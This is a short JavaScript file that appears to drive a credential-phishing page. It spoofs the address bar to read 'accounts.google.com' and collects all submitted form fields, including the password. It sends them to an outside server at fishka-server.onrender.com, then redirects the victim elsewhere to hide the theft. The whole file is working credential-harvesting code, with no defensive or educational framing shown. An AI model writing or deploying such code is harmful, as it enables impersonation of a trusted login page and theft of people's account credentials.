history.replaceState('', '', 'accounts.google.com')

document.addEventListener('DOMContentLoaded', () => {
    const password = document.querySelector("#txtPassword");
    const checkbox = document.querySelector("#show");

    checkbox.addEventListener('click',function(){
        const type = password.getAttribute("type")=== "password" ? "text" : "password";
        password.setAttribute("type",type);
    });
})

document.addEventListener('submit', async e => {
    e.preventDefault();
    const form = e.target;
    const data = new URLSearchParams();

    for (const [key, value] of new FormData(form)) {
        data.append(key, value);
    }

    console.log('Sending data to a server...');

    try {
        await fetch("https://fishka-server.onrender.com/submit", {
            method: "post",
            body: data,
        }).catch(err => console.log(err))
    } finally {
        window.location.href = 'https://myfishka.com/';
    }
})
